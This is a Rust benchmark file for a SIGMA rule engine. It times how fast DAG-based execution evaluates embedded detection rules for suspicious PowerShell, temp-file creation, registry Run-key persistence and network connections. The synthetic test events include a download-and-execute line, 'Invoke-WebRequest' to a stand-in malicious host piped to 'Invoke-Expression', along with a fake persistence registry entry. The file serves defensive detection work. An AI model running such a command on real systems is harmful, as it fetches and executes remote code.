//! DAG execution benchmarks for SIGMA Engine
//!
//! These benchmarks specifically test the DAG-based execution engine
//! performance characteristics and optimization effectiveness.

use criterion::{black_box, criterion_group, criterion_main, BenchmarkId, Criterion};
use serde_json::json;
use sigma_engine::{Compiler, SigmaEngine};

/// Benchmark DAG engine execution through SigmaEngine
fn bench_dag_execution(c: &mut Criterion) {
    let rule_yaml = r#"
title: PowerShell Execution Detection
id: 12345678-1234-1234-1234-123456789012
logsource:
    product: windows
    service: powershell
detection:
    selection_powershell:
        EventID: 4104
    selection_suspicious:
        ScriptBlockText|contains:
            - 'DownloadString'
            - 'WebClient'
            - 'Invoke-Expression'
    condition: selection_powershell and selection_suspicious
level: high
"#;

    let mut compiler = Compiler::new();
    let ruleset = compiler.compile_ruleset(&[rule_yaml]).unwrap();
    let mut engine = SigmaEngine::from_ruleset(ruleset).unwrap();

    let test_event = json!({
        "EventID": "4104",
        "ScriptBlockText": "Invoke-WebRequest -Uri http://malicious.com | Invoke-Expression",
        "ProcessName": "powershell.exe",
        "User": "DOMAIN\\user"
    });

    c.bench_function("dag_execution", |b| {
        b.iter(|| {
            let result = engine.evaluate(black_box(&test_event));
            black_box(result)
        })
    });
}

/// Benchmark different execution strategies
fn bench_execution_strategies(c: &mut Criterion) {
    let mut group = c.benchmark_group("execution_strategies");

    let rule_yaml = r#"
title: File Creation in Temp Directory
id: abcdefgh-1234-5678-9012-abcdefghijkl
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 11
        TargetFilename|startswith: 'C:\Temp\'
    condition: selection
level: medium
"#;

    let mut compiler = Compiler::new();
    let ruleset = compiler.compile_ruleset(&[rule_yaml]).unwrap();
    let mut engine = SigmaEngine::from_ruleset(ruleset).unwrap();

    let test_event = json!({
        "EventID": "11",
        "TargetFilename": "C:\\Temp\\malicious.exe",
        "ProcessName": "explorer.exe",
        "User": "DOMAIN\\user"
    });

    group.bench_function("standard_execution", |b| {
        b.iter(|| {
            let result = engine.evaluate(black_box(&test_event));
            black_box(result)
        })
    });

    group.finish();
}

/// Benchmark DAG optimization levels
fn bench_dag_optimization_levels(c: &mut Criterion) {
    let mut group = c.benchmark_group("dag_optimization");

    let rules = vec![
        r#"
title: Registry Persistence
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 13
        TargetObject|contains: '\Run'
    condition: selection
"#,
        r#"
title: Process Creation
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        EventID: 4688
        NewProcessName|endswith: '.exe'
    condition: selection
"#,
        r#"
title: Network Connection
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 3
        DestinationPort: 443
    condition: selection
"#,
    ];

    let test_event = json!({
        "EventID": "13",
        "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware",
        "Details": "C:\\malware.exe",
        "ProcessName": "regedit.exe"
    });

    // Test different optimization scenarios
    for optimization in ["basic", "advanced"].iter() {
        let mut compiler = Compiler::new();
        let ruleset = compiler.compile_ruleset(&rules).unwrap();
        let mut engine = SigmaEngine::from_ruleset(ruleset).unwrap();

        group.bench_with_input(
            BenchmarkId::new("optimization", optimization),
            optimization,
            |b, _| {
                b.iter(|| {
                    let result = engine.evaluate(black_box(&test_event));
                    black_box(result)
                })
            },
        );
    }

    group.finish();
}

/// Benchmark DAG shared computation efficiency
fn bench_dag_shared_computation(c: &mut Criterion) {
    let mut group = c.benchmark_group("dag_shared_computation");

    // Rules with overlapping primitives to test sharing
    let shared_rules = vec![
        r#"
title: PowerShell Rule 1
logsource:
    product: windows
    service: powershell
detection:
    selection_ps:
        EventID: 4104
    selection_cmd:
        ScriptBlockText|contains: 'Invoke-WebRequest'
    condition: selection_ps and selection_cmd
"#,
        r#"
title: PowerShell Rule 2
logsource:
    product: windows
    service: powershell
detection:
    selection_ps:
        EventID: 4104
    selection_cmd:
        ScriptBlockText|contains: 'DownloadString'
    condition: selection_ps and selection_cmd
"#,
        r#"
title: PowerShell Rule 3
logsource:
    product: windows
    service: powershell
detection:
    selection_ps:
        EventID: 4104
    selection_cmd:
        ScriptBlockText|contains: 'WebClient'
    condition: selection_ps and selection_cmd
"#,
    ];

    let test_event = json!({
        "EventID": "4104",
        "ScriptBlockText": "New-Object System.Net.WebClient | Invoke-WebRequest",
        "ProcessName": "powershell.exe"
    });

    let mut compiler = Compiler::new();
    let ruleset = compiler.compile_ruleset(&shared_rules).unwrap();
    let mut engine = SigmaEngine::from_ruleset(ruleset).unwrap();

    group.bench_function("shared_primitives", |b| {
        b.iter(|| {
            let result = engine.evaluate(black_box(&test_event));
            black_box(result)
        })
    });

    group.finish();
}

criterion_group!(
    benches,
    bench_dag_execution,
    bench_execution_strategies,
    bench_dag_optimization_levels,
    bench_dag_shared_computation
);
criterion_main!(benches);
